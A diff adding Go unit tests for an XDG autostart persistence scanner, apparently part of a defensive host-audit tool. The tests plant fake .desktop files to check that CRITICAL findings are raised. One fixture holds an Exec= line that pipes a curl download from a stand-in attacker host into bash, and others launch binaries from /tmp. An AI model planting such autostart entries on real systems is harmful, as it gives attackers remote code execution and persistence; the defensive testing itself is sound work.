@@ -192,3 +192,156 @@ func TestCronScanner_ContextAndOptions(t *testing.T) {
 	// findings may be nil or empty — both are acceptable.
 	_ = findings
 }
+
+// ---------------------------------------------------------------------------
+// XDGAutoStartScanner — interface and detection tests
+// ---------------------------------------------------------------------------
+
+func TestXDGAutoStartScanner_Interface(t *testing.T) {
+	s := persistence.NewXDGAutoStartScanner()
+
+	if s.Name() != "xdg_autostart" {
+		t.Errorf("Name() = %q, want %q", s.Name(), "xdg_autostart")
+	}
+	if s.Category() != "persistence" {
+		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
+	}
+	if s.RequiresRoot() {
+		t.Error("RequiresRoot() should be false")
+	}
+	if !s.Available() {
+		t.Error("Available() should be true")
+	}
+	if s.Description() == "" {
+		t.Error("Description() should not be empty")
+	}
+	if s.RequiredTools() != nil {
+		t.Error("RequiredTools() should be nil")
+	}
+	if s.OptionalTools() != nil {
+		t.Error("OptionalTools() should be nil")
+	}
+}
+
+func TestXDGAutoStartScanner_DoesNotError(t *testing.T) {
+	dir := t.TempDir()
+	s := persistence.NewXDGAutoStartScannerWithPaths(
+		filepath.Join(dir, "nonexistent-system"),
+		filepath.Join(dir, "nonexistent-home"),
+	)
+	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan returned unexpected error: %v", err)
+	}
+}
+
+// TestXDGAutoStartScanner_DetectsCurlInExec creates a fake .desktop file
+// whose Exec= line contains curl and verifies a CRITICAL finding is produced.
+func TestXDGAutoStartScanner_DetectsCurlInExec(t *testing.T) {
+	dir := t.TempDir()
+	autostartDir := filepath.Join(dir, "autostart")
+	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
+		t.Fatalf("MkdirAll: %v", err)
+	}
+
+	desktopContent := "[Desktop Entry]\nName=Updater\nType=Application\nExec=curl http://evil.example.com/payload.sh | bash\n"
+	desktopPath := filepath.Join(autostartDir, "updater.desktop")
+	if err := os.WriteFile(desktopPath, []byte(desktopContent), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+
+	s := persistence.NewXDGAutoStartScannerWithPaths(autostartDir, filepath.Join(dir, "home"))
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan returned error: %v", err)
+	}
+
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "xdg_autostart" && f.Severity == scanner.SevCritical {
+			found = true
+			if f.ID == "" {
+				t.Error("finding has empty ID")
+			}
+			if f.Evidence == "" {
+				t.Error("finding has empty Evidence")
+			}
+			if f.Location == "" {
+				t.Error("finding has empty Location")
+			}
+			if f.Remediation == "" {
+				t.Error("finding has empty Remediation")
+			}
+		}
+	}
+	if !found {
+		t.Errorf("expected CRITICAL finding for curl in Exec=, got: %+v", findings)
+	}
+}
+
+// TestXDGAutoStartScanner_DetectsTmpExecPath verifies that an Exec= pointing
+// into /tmp produces a CRITICAL finding.
+func TestXDGAutoStartScanner_DetectsTmpExecPath(t *testing.T) {
+	dir := t.TempDir()
+	autostartDir := filepath.Join(dir, "autostart")
+	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
+		t.Fatalf("MkdirAll: %v", err)
+	}
+
+	desktopContent := "[Desktop Entry]\nName=Backdoor\nType=Application\nExec=/tmp/malware --hidden\n"
+	desktopPath := filepath.Join(autostartDir, "backdoor.desktop")
+	if err := os.WriteFile(desktopPath, []byte(desktopContent), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+
+	s := persistence.NewXDGAutoStartScannerWithPaths(autostartDir, filepath.Join(dir, "home"))
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan returned error: %v", err)
+	}
+
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "xdg_autostart" && f.Severity == scanner.SevCritical {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected CRITICAL finding for Exec=/tmp/..., got: %+v", findings)
+	}
+}
+
+// TestXDGAutoStartScanner_ScansUserHomeDirs verifies that the scanner
+// also inspects ~/.config/autostart directories under the homeBase.
+func TestXDGAutoStartScanner_ScansUserHomeDirs(t *testing.T) {
+	dir := t.TempDir()
+
+	// Create a user home with an autostart entry.
+	userAutostart := filepath.Join(dir, "home", "alice", ".config", "autostart")
+	if err := os.MkdirAll(userAutostart, 0o755); err != nil {
+		t.Fatalf("MkdirAll: %v", err)
+	}
+	desktopContent := "[Desktop Entry]\nName=EvilUpdater\nType=Application\nExec=/tmp/evil --start\n"
+	if err := os.WriteFile(filepath.Join(userAutostart, "evil.desktop"), []byte(desktopContent), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+
+	s := persistence.NewXDGAutoStartScannerWithPaths(
+		filepath.Join(dir, "nonexistent-system"),
+		filepath.Join(dir, "home"),
+	)
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan returned error: %v", err)
+	}
+
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "xdg_autostart" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected finding from user autostart dir, got: %+v", findings)
+	}
+}
